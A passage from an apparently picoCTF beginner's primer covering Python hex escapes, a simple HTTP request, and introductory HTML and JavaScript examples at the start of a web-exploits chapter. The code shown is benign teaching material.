                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>0 1 2 3 4 5 6 7 8 9 a b c d e f</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>The binary base (or base 2) has these symbols:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>0 1</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>The decimal base (or base 10), has the following symbols:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>0 1 2 3 4 5 6 7 8 9</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Lets see in python how can we use the hexadecimal representation to print
                            characters. In a python string, you can put \x which is a special sequence to
                            tell python that the following two characters are a hexadecimal number:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;picoCTF&quot;</span><span class="tok-p">)</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;</span><span class="tok-se">\x70\x69\x63\x6f\x43\x54\x46</span><span class="tok-s2">&quot;</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>When you run that program you should see:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>picoCTF
picoCTF</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Check the table to see that the characters match!</p>
                    </div>
                    <div class="paragraph">
                        <p>As a challenge, print the string I_LOVE_PICOCTF only using hexadecimal. Note
                            that uppercase letters are represented by a different hexadecimal number than
                            lowercase letters.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_pwntools">4.8. Pwntools</h3>
                    <div class="paragraph">
                        <p>For binary exploitation, there is a very useful library called pwntools:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="http://docs.pwntools.com/en/stable">http://docs.pwntools.com/en/stable</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Keep this library in mind as an important part of python for exploitation. You
                            do not need to learn anything right now. We will teach how to use it in binary
                            exploitation.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_http_requests_in_python">4.9. Http requests in python</h3>
                    <div class="paragraph">
                        <p>Below is an example of how you can request a web page in python. Here we are
                            requesting the HTML of the picoCTF website. Right now, maybe you do not know
                            HTML and worry this will not make much sense to you. After you are done with
                            the Web section, come back here and try this example:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-kn">import</span> <span class="tok-nn">http.client</span>
<span class="tok-n">conn</span> <span class="tok-o">=</span> <span class="tok-n">http</span><span class="tok-o">.</span><span class="tok-n">client</span><span class="tok-o">.</span><span class="tok-n">HTTPSConnection</span><span class="tok-p">(</span><span class="tok-s2">&quot;picoctf.org&quot;</span><span class="tok-p">)</span>
<span class="tok-n">conn</span><span class="tok-o">.</span><span class="tok-n">request</span><span class="tok-p">(</span><span class="tok-s2">&quot;GET&quot;</span><span class="tok-p">,</span> <span class="tok-s2">&quot;/&quot;</span><span class="tok-p">)</span>
<span class="tok-n">r1</span> <span class="tok-o">=</span> <span class="tok-n">conn</span><span class="tok-o">.</span><span class="tok-n">getresponse</span><span class="tok-p">()</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">r1</span><span class="tok-o">.</span><span class="tok-n">status</span><span class="tok-p">,</span> <span class="tok-n">r1</span><span class="tok-o">.</span><span class="tok-n">reason</span><span class="tok-p">)</span>
<span class="tok-c1"># 200 OK</span>
<span class="tok-n">data1</span> <span class="tok-o">=</span> <span class="tok-n">r1</span><span class="tok-o">.</span><span class="tok-n">read</span><span class="tok-p">()</span>
<span class="tok-n">conn</span><span class="tok-o">.</span><span class="tok-n">request</span><span class="tok-p">(</span><span class="tok-s2">&quot;GET&quot;</span><span class="tok-p">,</span> <span class="tok-s2">&quot;/a&quot;</span><span class="tok-p">)</span>
<span class="tok-n">r2</span> <span class="tok-o">=</span> <span class="tok-n">conn</span><span class="tok-o">.</span><span class="tok-n">getresponse</span><span class="tok-p">()</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">r2</span><span class="tok-o">.</span><span class="tok-n">status</span><span class="tok-p">,</span> <span class="tok-n">r2</span><span class="tok-o">.</span><span class="tok-n">reason</span><span class="tok-p">)</span>
<span class="tok-c1"># 404 Not Found</span>
<span class="tok-n">data2</span> <span class="tok-o">=</span> <span class="tok-n">r2</span><span class="tok-o">.</span><span class="tok-n">read</span><span class="tok-p">()</span>
<span class="tok-n">conn</span><span class="tok-o">.</span><span class="tok-n">close</span><span class="tok-p">()</span></code></pre>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="sect1">
            <h2 id="_web_exploits">5. Web Exploits</h2>
            <div class="sectionbody">
                <h5 id="_samuel_sabogal_pardo_2" class="discrete">Samuel Sabogal Pardo</h5>
                <div class="paragraph">
                    <p></p>
                </div>
                <hr>
                <div class="paragraph">
                    <p>Web exploits are a nice starting point to dive into the world of hacking. Chances are that you
                        are familiar with a web browser, so you will feel you are working on something that you already
                        know!</p>
                </div>
                <div class="sect2">
                    <h3 id="_html">5.1. Html</h3>
                    <div class="paragraph">
                        <p>Before diving into Web Exploits, you need to understand how a website works. Many years ago,
                            the web was used to visit static pages that did not have interactive features; they just
                            showed information. To do a static page, it is enough to write some lines of HTML. What is
                            HTML? First, it is not a programming language. Html means HyperText Markup Language, and we
                            use it to determine the font size, colors, margins, or similar features in a web page. When
                            an html file is accessed in a browser like Firefox, Chrome or whichever browser you like,
                            the browser presents the text according to the html on it. Your browser can access an html
                            file locally. Locally means that the file could be in your laptop or file system. In
                            contrast, it could access the file remotely through the Internet. Let&#8217;s see an example
                            of creating a simple html and access it locally:</p>
                    </div>
                    <div class="olist arabic">
                        <ol class="arabic">
                            <li>
                                <p>On your computer, create a folder called "picoexample" and then, inside that folder,
                                    create a text file and name it "myFirstPage.html". You can do this on Notepad on
                                    Windows, Textedit on Mac, or any text editor from Linux. It is important that the
                                    extension is ".html". It cannot be ".html.txt" or something that is not exactly
                                    ".html". If you don&#8217;t see the extension in your operating system, this is a
                                    good opportunity to google how to make it appear to be able to modify it. Remember,
                                    for obstacles that might appear along the way, google is the answer.</p>
                            </li>
                            <li>
                                <p>Edit the content in a text editor and write: Hello World!</p>
                            </li>
                            <li>
                                <p>Save the file</p>
                            </li>
                            <li>
                                <p>Open the file in any browser. To do that, you can right click on the file, and then
                                    select "open with" and choose the browser you want. You should see a page like the
                                    following:</p>
                            </li>
                        </ol>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image13.png" alt="image" width="624" height="46">
                        </div>
                        <div class="title">Figure 8. Hello World! page</div>
                    </div>
                    <div class="olist arabic">
                        <ol class="arabic">
                            <li>
                                <p>Now, in the text editor, modify the content of the file and replace the text by:
                                    &lt;b&gt;Hello World!&lt;/b&gt;</p>
                            </li>
                            <li>
                                <p>Save the file on the text editor. Then, open the file in the browser again, or you
                                    can simply click refresh on your browser. Since it already has opened the file, you
                                    will see the message in bold, similar to this:</p>
                            </li>
                        </ol>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image27.png" alt="image" width="624" height="46">
                        </div>
                        <div class="title">Figure 9. Hello World! page in bold</div>
                    </div>
                    <div class="paragraph">
                        <p>You just created a page with a very simple HTML that made your message appear in bold. Note
                            that &lt;b&gt; is the opening tag, &lt;/b&gt; is the closing tag. Analyze the difference
                            between the opening and closing tag. What do you see? The closing tag is usually the same as
                            the opening tag, but you include "/" like we just did. We just used an html tag to tell the
                            browser we want some specific text in bold. Html is just a bunch of tags that allow us to do
                            similar things.</p>
                    </div>
                    <div class="paragraph">
                        <p>Now let&#8217;s make a page with more fields so you can get a sense of tags and the structure
                            of a bigger page. Use the following HTML code to replace the content of the file you are
                            editing:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="html"><span></span><span class="tok-p">&lt;</span><span class="tok-nt">html</span><span class="tok-p">&gt;</span>
<span class="tok-p">&lt;</span><span class="tok-nt">head</span><span class="tok-p">&gt;</span>
   <span class="tok-p">&lt;</span><span class="tok-nt">title</span><span class="tok-p">&gt;</span>This is a picoCTF html Example<span class="tok-p">&lt;/</span><span class="tok-nt">title</span><span class="tok-p">&gt;</span>
<span class="tok-p">&lt;/</span><span class="tok-nt">head</span><span class="tok-p">&gt;</span>
<span class="tok-p">&lt;</span><span class="tok-nt">body</span><span class="tok-p">&gt;</span>
   <span class="tok-p">&lt;</span><span class="tok-nt">h1</span><span class="tok-p">&gt;</span>This is a Heading<span class="tok-p">&lt;/</span><span class="tok-nt">h1</span><span class="tok-p">&gt;</span>
   <span class="tok-p">&lt;</span><span class="tok-nt">h2</span><span class="tok-p">&gt;</span>This is a smaller Heading<span class="tok-p">&lt;/</span><span class="tok-nt">h2</span><span class="tok-p">&gt;</span>
   <span class="tok-p">&lt;</span><span class="tok-nt">p</span><span class="tok-p">&gt;</span>This is a paragraph.<span class="tok-p">&lt;/</span><span class="tok-nt">p</span><span class="tok-p">&gt;</span>
   The following is an image:<span class="tok-p">&lt;</span><span class="tok-nt">br</span><span class="tok-p">&gt;</span>
   <span class="tok-p">&lt;</span><span class="tok-nt">img</span> <span class="tok-na">src</span><span class="tok-o">=</span><span class="tok-s">&quot;picologo.png&quot;</span> <span class="tok-p">/&gt;</span>
<span class="tok-p">&lt;/</span><span class="tok-nt">body</span><span class="tok-p">&gt;</span>
<span class="tok-p">&lt;/</span><span class="tok-nt">html</span><span class="tok-p">&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>As you did before, save the file in the text editor and click refresh on the browser. You
                            probably see something like this:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image17.png" alt="image" width="624" height="496">
                        </div>
                        <div class="title">Figure 10. Headings of different size and broken image</div>
                    </div>
                    <div class="paragraph">
                        <p>If you read the html code and try to analyze its content, you will realize the following:</p>
                    </div>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>The title shown in that tab of the browser "This is a picoCTF html Example", appears
                                    there because you put that text inside in the &lt;title&gt;&lt;/title&gt; tags.</p>
                            </li>
                            <li>
                                <p>&lt;h1&gt; Is used to create a big heading</p>
                            </li>
                            <li>
                                <p>&lt;h2&gt; creates a heading smaller than &lt;h1&gt;</p>
                            </li>
                            <li>
                                <p>The &lt;head&gt; tags are used to group introductory content, in this case the title,
                                    but if you remove this tag, you will not see much change in our page. Do the
                                    experiment of removing it. If you only remove the opening or closing tag it will
                                    cause an html error, so make sure to delete the opening tag and closing tag.</p>
                            </li>
                            <li>
                                <p>The &lt;body&gt; tags are used to group the main content of the page. If you remove
                                    them you will not see much change in our page because we have just a few things.
                                    However, in several cases you might break a page completely if you remove a tag
                                    without proper care.</p>
                            </li>
                        </ul>
                    </div>
                    <div class="paragraph">
                        <p>You may have noted the &lt;img&gt; tag is not showing any image as it should. Why?
                            Let&#8217;s analyze the element img:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="html"><span></span><span class="tok-p">&lt;</span><span class="tok-nt">img</span> <span class="tok-na">src</span><span class="tok-o">=</span><span class="tok-s">&quot;picologo.png&quot;</span> <span class="tok-p">/&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>First you see there is not opening or closing tag, there is just one tag with the slash at
                            the right-hand side. This is ok for an image. As you can see, it has an
                            <strong>attribute</strong> called "src", which means source. We are assigning to "src" the
                            value "picologo.png". Our html is going to try to access a file called "picologo.png" in the
                            same folder where "myFirstPage.html" is contained, which is the folder we name at first
                            "picoexample". There is no image called "picologo.png", so the browser has nothing to show.
                            Copy and paste an image to the folder and name it "picologo.png". The extension of the image
                            has to be ".png". If you have an image with a different extension, you can just use the
                            extension you need in the "src" attribute in your html. For example, if the extension of the
                            image you have is ".jpg" you can simply replace
                        </p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="html"><span></span><span class="tok-p">&lt;</span><span class="tok-nt">img</span> <span class="tok-na">src</span><span class="tok-o">=</span><span class="tok-s">&quot;picologo.png&quot;</span> <span class="tok-p">/&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>with</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="html"><span></span><span class="tok-p">&lt;</span><span class="tok-nt">img</span> <span class="tok-na">src</span><span class="tok-o">=</span><span class="tok-s">&quot;picologo.jpg&quot;</span> <span class="tok-p">/&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>If you successfully created the image in the folder, and refresh the browser you will see the
                            following, of course, with your own custom image:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image22.png" alt="image" width="624" height="496">
                        </div>
                        <div class="title">Figure 11. Custom image</div>
                    </div>
                    <div class="paragraph">
                        <p>A fundamental part of web sites are the links. The link tag is <strong>&lt;a&gt;</strong>,
                            the following is an example of a link directed to google:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="html"><span></span><span class="tok-p">&lt;</span><span class="tok-nt">a</span> <span class="tok-na">href</span><span class="tok-o">=</span><span class="tok-s">&quot;http://google.com&quot;</span> <span class="tok-p">&gt;</span> Go to google! <span class="tok-p">&lt;/</span><span class="tok-nt">a</span><span class="tok-p">&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Use that element and put it in your code to make a link to the web site you want. Now
                            practice by adding more html tags and images in your page! This is a reference in which you
                            can find more html tags:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://www.w3schools.com/tags/" target="_blank"
                                rel="noopener">https://www.w3schools.com/tags/</a></p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_javascript">5.2. JavaScript</h3>
                    <div class="paragraph">
                        <p>To make pages more interactive JavaScript is commonly used. JavaScript is a programming
                            language! We can do algorithms using it. JavaScript is executed in your browser. For
                            example, when you visit a website, the JavaScript code is downloaded along the HTML and it
                            only executes once it is loaded in your browser. When you visit a page, you are downloading
                            an html file and your browser interprets the tags and prints the text and images as we
                            learned before. This image illustrates that process:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image26.png" alt="image" width="624" height="357">
                        </div>
                        <div class="title">Figure 12. Client to server communication</div>
                    </div>
                    <div class="paragraph">
                        <p>If that file happens to contain JavaScript, your browser will execute it. Let&#8217;s look at
                            an example. In the same folder "picoexample", create a file called "myFirstJS.html" using a
                            text editor. Then, put the following content in the file:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="html"><span></span><span class="tok-p">&lt;</span><span class="tok-nt">html</span><span class="tok-p">&gt;</span>
    <span class="tok-p">&lt;</span><span class="tok-nt">head</span><span class="tok-p">&gt;</span>
        <span class="tok-p">&lt;</span><span class="tok-nt">title</span><span class="tok-p">&gt;</span>This is a picoCTF JS Example<span class="tok-p">&lt;/</span><span class="tok-nt">title</span><span class="tok-p">&gt;</span>
        <span class="tok-p">&lt;</span><span class="tok-nt">script</span><span class="tok-p">&gt;</span>
<span class="tok-w">            </span><span class="tok-nx">alert</span><span class="tok-p">(</span><span class="tok-s2">&quot;Hello picoCTF&quot;</span><span class="tok-p">);</span>
<span class="tok-w">        </span><span class="tok-p">&lt;/</span><span class="tok-nt">script</span><span class="tok-p">&gt;</span>
    <span class="tok-p">&lt;/</span><span class="tok-nt">head</span><span class="tok-p">&gt;</span>
    <span class="tok-p">&lt;</span><span class="tok-nt">body</span><span class="tok-p">&gt;</span>
        <span class="tok-p">&lt;</span><span class="tok-nt">h1</span><span class="tok-p">&gt;</span>JavaScript example<span class="tok-p">&lt;/</span><span class="tok-nt">h1</span><span class="tok-p">&gt;</span>&gt;
    <span class="tok-p">&lt;/</span><span class="tok-nt">body</span><span class="tok-p">&gt;</span>
<span class="tok-p">&lt;/</span><span class="tok-nt">html</span><span class="tok-p">&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Save the file. As soon as you open the page, you will see an alert showing "Hello picoCTF",
                            something like this:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image5.png" alt="image" width="624" height="496">
                        </div>
                        <div class="title">Figure 13. Alert "hello picoCTF"</div>
                    </div>
                    <div class="paragraph">
                        <p>If you analyze the file, you will note that the magic is happening in this element:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="html"><span></span><span class="tok-p">&lt;</span><span class="tok-nt">script</span><span class="tok-p">&gt;</span>
<span class="tok-w">    </span><span class="tok-nx">alert</span><span class="tok-p">(</span><span class="tok-s2">&quot;Hello picoCTF&quot;</span><span class="tok-p">);</span>
<span class="tok-p">&lt;/</span><span class="tok-nt">script</span><span class="tok-p">&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Whatever you put inside the tags "&lt;script&gt; &lt;/script&gt;" will be tried to execute by
                            the browser as JavaScript. Since JavaScript is a programming language, we should be able to
                            do some arithmetic. Replace the string "Hello picoCTF" by an arithmetic operation, like 8*8,
                            like this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="html"><span></span><span class="tok-p">&lt;</span><span class="tok-nt">script</span><span class="tok-p">&gt;</span>
<span class="tok-w">    </span><span class="tok-nx">alert</span><span class="tok-p">(</span><span class="tok-mf">8</span><span class="tok-o">*</span><span class="tok-mf">8</span><span class="tok-p">);</span>
<span class="tok-p">&lt;/</span><span class="tok-nt">script</span><span class="tok-p">&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Note that we only use quotes when we want to use a string. In arithmetic operations we
                            don&#8217;t use quotes. Save the file and refresh the browser. You should see the following:
                        </p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image18.png" alt="image" width="624" height="496">
                        </div>
                        <div class="title">Figure 14. Arithmetic result</div>
                    </div>
                    <div class="paragraph">
                        <p>Click Ok in the alert message to make it go away. Anything you write in JavaScript or html
                            will be visible for any user that accesses your page in a browser. To see the html and
                            JavaScript code in your browser right click the page and then "View Page Source"</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image10.png" alt="image" width="402" height="296">
                        </div>
                        <div class="title">Figure 15. Right click to view page source</div>
                    </div>
                    <div class="paragraph">
                        <p>You will see the JavaScript code you just wrote:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image6.png" alt="image" width="474" height="376">
                        </div>
                        <div class="title">Figure 16. HTML source code</div>
                    </div>
                    <div class="paragraph">
                        <p>This is a very important thing! Never put a secret in your JavaScript code or html. If
                            someone does it, that will be a vulnerability in your page. As a hacker you can try to look
                            for secrets on the html of a page you want to exploit.</p>
                    </div>
                    <div class="paragraph">
                        <p>Now let&#8217;s use some more elaborated code. We are going to make a page that adds two
                            numbers input by the user and shows the result in an alert. We will explain its code in
                            detail later. The code is the following:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="html"><span></span><span class="tok-p">&lt;</span><span class="tok-nt">html</span><span class="tok-p">&gt;</span>
    <span class="tok-p">&lt;</span><span class="tok-nt">head</span><span class="tok-p">&gt;</span>
        <span class="tok-p">&lt;</span><span class="tok-nt">title</span><span class="tok-p">&gt;</span>This is a picoCTF JS Example<span class="tok-p">&lt;/</span><span class="tok-nt">title</span><span class="tok-p">&gt;</span>
        <span class="tok-p">&lt;</span><span class="tok-nt">script</span><span class="tok-p">&gt;</span>
<span class="tok-w">            </span><span class="tok-kd">function</span><span class="tok-w"> </span><span class="tok-nx">myFunctionSum</span><span class="tok-p">(){</span>
<span class="tok-w">                </span><span class="tok-kd">var</span><span class="tok-w"> </span><span class="tok-nx">number1</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-nb">document</span><span class="tok-p">.</span><span class="tok-nx">getElementById</span><span class="tok-p">(</span><span class="tok-s2">&quot;number1&quot;</span><span class="tok-p">).</span><span class="tok-nx">value</span><span class="tok-p">;</span>
<span class="tok-w">                </span><span class="tok-kd">var</span><span class="tok-w"> </span><span class="tok-nx">number2</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-nb">document</span><span class="tok-p">.</span><span class="tok-nx">getElementById</span><span class="tok-p">(</span><span class="tok-s2">&quot;number2&quot;</span><span class="tok-p">).</span><span class="tok-nx">value</span><span class="tok-p">;</span>
<span class="tok-w">                </span><span class="tok-kd">var</span><span class="tok-w"> </span><span class="tok-nx">result</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-nb">Number</span><span class="tok-p">(</span><span class="tok-nx">number1</span><span class="tok-p">)</span><span class="tok-w"> </span><span class="tok-o">+</span><span class="tok-w"> </span><span class="tok-nb">Number</span><span class="tok-p">(</span><span class="tok-nx">number2</span><span class="tok-p">);</span>
<span class="tok-w">                </span><span class="tok-nx">alert</span><span class="tok-p">(</span><span class="tok-nx">result</span><span class="tok-p">);</span>
<span class="tok-w">            </span><span class="tok-p">}</span>
<span class="tok-w">        </span><span class="tok-p">&lt;/</span><span class="tok-nt">script</span><span class="tok-p">&gt;</span>
    <span class="tok-p">&lt;/</span><span class="tok-nt">head</span><span class="tok-p">&gt;</span>
    <span class="tok-p">&lt;</span><span class="tok-nt">body</span><span class="tok-p">&gt;</span>
        <span class="tok-p">&lt;</span><span class="tok-nt">h1</span><span class="tok-p">&gt;</span>JavaScript example to add2 numbers<span class="tok-p">&lt;/</span><span class="tok-nt">h1</span><span class="tok-p">&gt;</span>
        Input the first number<span class="tok-p">&lt;</span><span class="tok-nt">br</span><span class="tok-p">&gt;</span>
        <span class="tok-p">&lt;</span><span class="tok-nt">input</span> <span class="tok-na">type</span><span class="tok-o">=</span><span class="tok-s">&quot;text&quot;</span> <span class="tok-na">id</span><span class="tok-o">=</span><span class="tok-s">&quot;number1&quot;</span>  <span class="tok-p">&gt;&lt;</span><span class="tok-nt">br</span><span class="tok-p">&gt;</span>
        Input the second number<span class="tok-p">&lt;</span><span class="tok-nt">br</span><span class="tok-p">&gt;</span>
        <span class="tok-p">&lt;</span><span class="tok-nt">input</span> <span class="tok-na">type</span><span class="tok-o">=</span><span class="tok-s">&quot;text&quot;</span> <span class="tok-na">id</span><span class="tok-o">=</span><span class="tok-s">&quot;number2&quot;</span> <span class="tok-p">&gt;&lt;</span><span class="tok-nt">br</span><span class="tok-p">&gt;</span>
        <span class="tok-p">&lt;</span><span class="tok-nt">button</span> <span class="tok-na">onclick</span><span class="tok-o">=</span><span class="tok-s">&quot;myFunctionSum()&quot;</span><span class="tok-p">&gt;</span> Show alert! <span class="tok-p">&lt;/</span><span class="tok-nt">button</span><span class="tok-p">&gt;</span>
    <span class="tok-p">&lt;/</span><span class="tok-nt">body</span><span class="tok-p">&gt;</span>
<span class="tok-p">&lt;/</span><span class="tok-nt">html</span><span class="tok-p">&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Put it on a text file, save it, and open it on a browser as usual. You should see this:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image3.png" alt="image" width="492" height="390">
                        </div>
                        <div class="title">Figure 17. Add two numbers</div>
                    </div>
                    <div class="paragraph">
                        <p>If you put the numbers in each text field, and click "show alert!", you will see the alert
                            with the result. For this example let&#8217;s input 4 and 2 in the text fields, you should
                            see:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image23.png" alt="image" width="510" height="405">
                        </div>
                        <div class="title">Figure 18. Alert result</div>
                    </div>
                    <div class="paragraph">
                        <p>Now that you know what the page does, let&#8217;s analyze the new lines of the code. In this
                            line we have an input tag:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="html"><span></span><span class="tok-p">&lt;</span><span class="tok-nt">input</span> <span class="tok-na">type</span><span class="tok-o">=</span><span class="tok-s">&quot;text&quot;</span> <span class="tok-na">id</span><span class="tok-o">=</span><span class="tok-s">&quot;number1&quot;</span> <span class="tok-p">&gt;&lt;</span><span class="tok-nt">br</span><span class="tok-p">&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>As you can see, it is of type text, and it has an "id" with the value of "number1". The value
                            of the "id", in this case "number1", is something we arbitrarily define to be able to access
                            the content of this text input in JavaScript. This line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="html"><span></span><span class="tok-p">&lt;</span><span class="tok-nt">button</span> <span class="tok-na">onclick</span><span class="tok-o">=</span><span class="tok-s">&quot;myFunctionSum()&quot;</span><span class="tok-p">&gt;</span> Show alert! <span class="tok-p">&lt;/</span><span class="tok-nt">button</span><span class="tok-p">&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Is responsible for calling the function "myFunctionSum()" when the button is clicked. A
                            function is just a piece of code that we can define, so whenever is called it executes the
                            code inside. In this case, we named the function "myFunctionSum", but is is possible to give
                            it any name. The function has to be defined inside the script tags. Try to read the function
                            and understand at a general level what each line is doing:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="javascript"><span></span><span class="tok-kd">function</span><span class="tok-w"> </span><span class="tok-nx">myFunctionSum</span><span class="tok-p">(){</span>
<span class="tok-w">  </span><span class="tok-kd">var</span><span class="tok-w"> </span><span class="tok-nx">number1</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-nb">document</span><span class="tok-p">.</span><span class="tok-nx">getElementById</span><span class="tok-p">(</span><span class="tok-s2">&quot;number1&quot;</span><span class="tok-p">).</span><span class="tok-nx">value</span><span class="tok-p">;</span>
<span class="tok-w">  </span><span class="tok-kd">var</span><span class="tok-w"> </span><span class="tok-nx">number2</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-nb">document</span><span class="tok-p">.</span><span class="tok-nx">getElementById</span><span class="tok-p">(</span><span class="tok-s2">&quot;number2&quot;</span><span class="tok-p">).</span><span class="tok-nx">value</span><span class="tok-p">;</span>
<span class="tok-w">  </span><span class="tok-kd">var</span><span class="tok-w"> </span><span class="tok-nx">result</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-nb">Number</span><span class="tok-p">(</span><span class="tok-nx">number1</span><span class="tok-p">)</span><span class="tok-w"> </span><span class="tok-o">+</span><span class="tok-w"> </span><span class="tok-nb">Number</span><span class="tok-p">(</span><span class="tok-nx">number2</span><span class="tok-p">);</span>
<span class="tok-w">  </span><span class="tok-nx">alert</span><span class="tok-p">(</span><span class="tok-nx">result</span><span class="tok-p">);</span>
<span class="tok-p">}</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Perhaps a confusing part is the following line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="javascript"><span></span><span class="tok-w">  </span><span class="tok-kd">var</span><span class="tok-w"> </span><span class="tok-nx">result</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-nb">Number</span><span class="tok-p">(</span><span class="tok-nx">number1</span><span class="tok-p">)</span><span class="tok-w"> </span><span class="tok-o">+</span><span class="tok-w"> </span><span class="tok-nb">Number</span><span class="tok-p">(</span><span class="tok-nx">number2</span><span class="tok-p">);</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>When the variables are defined, both number1 and number2 are textual not
                            numerical. This line turns them into numbers before adding them together. Why
                            don&#8217;t you experiment and see what happens when these variables aren&#8217;t converted
                            to numbers?</p>
                    </div>
                    <div class="paragraph">
                        <p>Challenge! Modify the file to multiply the two numbers. When you are done with that, include
                            a new third input number to multiply three different numbers! At this point you should be
                            able to do it on your own. Be careful with the syntax, remember that a single character
                            wrong might break the whole code.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_server_code">5.3. Server code</h3>
                    <div class="paragraph">
                        <p>As we said previously, JavaScript is executed only in the browser. What if you want to do
                            calculations and store data in the remote server? For example, when you login into a
                            Website, your user and password has to be verified on the server. The password is stored in
                            the server and should not travel outside of it for the sake of security. If you would verify
                            a password on JavaScript, you would be able to see it on your browser in the same way you
                            can see any JavaScript, and that would be very insecure. There are several programming
                            languages that can be executed on the server, for instance:</p>
                    </div>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>Python</p>
                            </li>
                            <li>
                                <p>Java</p>
                            </li>
                            <li>
                                <p>PHP</p>
                            </li>
                            <li>
                                <p>C</p>
                            </li>
                            <li>
                                <p>C Sharp</p>
                            </li>
                            <li>
                                <p>And many more&#8230;&#8203;</p>
                            </li>
                        </ul>
                    </div>
                    <div class="paragraph">
                        <p>For our examples, we will begin using PHP, not because we think is a great language, but
                            because a huge number of websites on the Internet use it and it is very easy to learn and
                            deploy. In any case, as a hacker, you would generally have to learn all the languages you
                            can because different websites are made on different languages, as well as CTF challenges
                            that try to simulate real life! The more a language is used, the more likely you will have
                            to attack a website made with it. However, the vulnerabilities we will be explaining can
